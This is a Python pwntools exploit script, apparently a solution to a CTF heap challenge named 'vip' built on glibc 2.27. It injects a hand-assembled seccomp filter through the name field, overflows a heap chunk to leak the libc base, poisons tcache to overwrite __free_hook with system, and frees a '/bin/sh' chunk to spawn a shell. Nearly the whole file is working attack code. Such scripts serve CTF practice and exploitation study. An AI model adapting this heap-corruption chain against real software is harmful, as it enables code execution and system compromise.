from pwn import *
import sys, os
context.log_level = 'debug'
prog = './vip'
elf = ELF(prog)
p = process(prog)
libc = ELF("./libc-2.27.so")
#p = remote("")
def dbg():
    gdb.attach(p)
    p.interactive()

def add(idx):
	p.sendlineafter("Your choice: ", '1')
	p.sendlineafter("Index: ", str(idx))
def show(idx):
	p.sendlineafter("Your choice: ", '2')
	p.sendlineafter("Index: ", str(idx))
def edit(idx, size, content):
	p.sendlineafter("Your choice: ", '4')
	p.sendlineafter("Index: ", str(idx))
	p.sendlineafter("Size: ", str(size))
	p.sendafter("Content: ", content)
def free(idx):
	p.sendlineafter("Your choice: ", '3')
	p.sendlineafter("Index: ", str(idx))
def vip(payload):
	p.sendlineafter("Your choice: ", '6')
	p.sendafter("name: \n", 'a'*0x20+payload)

def exp():
	payload = " \x00\x00\x00\x18\x00\x00\x00\x15\x00\x01\x00~ @\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x05\x00"
	vip(payload)
	print len(payload)
	add(0)
	add(1)
	for i in range(11):
		add(2)
	add(3)
	edit(0, 0x60, 'a'*0x50+p64(0)+p64(0x421))
	free(1)
	edit(0, 0x60, 'a'*0x60)
	show(0)
	p.recv(0x60)
	libc_base = u64(p.recv(6)+'\x00'*2)-4111520
	success(hex(libc_base))
	free(3)
	edit(2, 0x68, 'a'*0x50+p64(0)+p64(0x61)+p64(libc_base + libc.sym['__free_hook']))
	add(4)
	edit(4, 8, '/bin/sh\x00')
	add(5)
	edit(5, 8, p64(libc_base+libc.sym['system']))
	free(4)
	#dbg()
	p.interactive()
if __name__ == '__main__':
	exp()
'''
A = args[1]
A == 0x40207e? ok:next
return ALLOW
ok:
return ERRNO(0)
u@ubuntu:~/Desktop$ seccomp-tools asm a.asm 
" \x00\x00\x00\x18\x00\x00\x00\x15\x00\x01\x00~ @\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x05\x00"
'''